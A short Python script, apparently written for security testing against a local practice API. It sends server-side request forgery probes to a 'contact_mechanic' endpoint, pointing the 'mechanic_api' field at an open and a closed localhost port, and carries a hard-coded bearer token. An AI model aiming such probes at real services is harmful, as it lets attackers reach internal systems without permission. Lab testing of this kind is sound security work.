import httpx
import json

url = "http://localhost:8888/workshop/api/merchant/contact_mechanic"
headers = {
    "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ6YXBfdXNlcl9hcTk5ZWRAZXhhbXBsZS5jb20iLCJpYXQiOjE3Njk0NTYwMTMsImV4cCI6MTc3MDA2MDgxMywicm9sZSI6InVzZXIifQ.nCbZbPGaJ_N9xr_jsoqKunNT0pmA87SayrlN9pU3jOt-sKYi2DJvWAO8DFb806HL-b3QI_LByz3OWzQMk4SOHqHvpPFHq1j-Iqlgfq0VAwBjvUJ2zZvbv7MML2E-056QhMj96R1dC31XhQq0Uy-C1PVNtwwkAOzcnt6viLCiapA2t3Hqu455s4WA14ZEh1wARoXz5lk3Nwb0uSFnjreWw5RcATefkFGyzdlUNtdame9iXQXEY5WJfZY4IrV5C77qAcRiL8nmE3GfCVcWftdZW78ziM0b26TpjK4X536_49bY4iraDTRZTXFJ2_dg7twX1QL1X0_x_la8Q4Mzh42EuQ",
    "Content-Type": "application/json"
}

# Payload based on Spec Example
payload = {
    "mechanic_api": "http://localhost:8888", 
    "mechanic_code": "TRAC_MECH1", # Valid code
    "number_of_repeats": 1,
    "repeat_request_if_failed": False,
    "problem_details": "Test SSRF",
    "vin": "8UOLV89RGKL908077" # Valid VIN
}

print(f"Testing Payload: {payload['mechanic_api']}")
try:
    with httpx.Client() as client:
        res = client.post(url, headers=headers, json=payload, timeout=10)
        print(f"Status: {res.status_code}")
        print(f"Body: {res.text}")
except Exception as e:
    print(f"Error: {e}")

print("-" * 20)

# Test Controlled Payload (Closed Port)
payload["mechanic_api"] = "http://localhost:9999"
print(f"Testing Payload: {payload['mechanic_api']}")
try:
    with httpx.Client() as client:
        res = client.post(url, headers=headers, json=payload, timeout=10)
        print(f"Status: {res.status_code}")
        print(f"Body: {res.text}")
except Exception as e:
    print(f"Error: {e}")
